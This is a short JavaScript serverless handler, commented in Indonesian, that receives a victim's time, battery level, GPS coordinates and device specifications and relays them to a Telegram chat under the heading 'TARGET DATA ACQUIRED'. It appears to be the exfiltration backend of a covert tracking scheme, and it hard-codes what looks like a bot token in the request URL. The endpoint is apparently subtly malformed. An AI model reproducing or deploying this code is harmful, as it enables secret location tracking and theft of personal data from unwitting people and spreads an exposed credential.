export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const bodyData = req.body;
        
        // Menyusun format pesan Telegram yang rapi dengan data Baterai & GPS baru
        const pesanText = `[!] TARGET DATA ACQUIRED\n\n` +
                          `📅 Waktu: ${bodyData.waktu}\n` +
                          `🔋 Status Baterai: ${bodyData.baterai}\n` +
                          `🌐 Koordinat GPS: ${bodyData.gps}\n\n` +
                          `💻 Spesifikasi Perangkat:\n${bodyData.device}\n\n` +
                          `Status: Secure Relayed Success.`;

        const telegramRes = await fetch(`https://telegram.org/8859660921:AAHL9cUwG2nX1PmfMYUm6QyMnUCh73e_77g/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: pesanText })
        });

        const telegramData = await telegramRes.json();

        if (telegramData.ok) {
            return res.status(200).json({ status: 'success' });
        } else {
            return res.status(500).json({ error: 'Telegram API error' });
        }
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}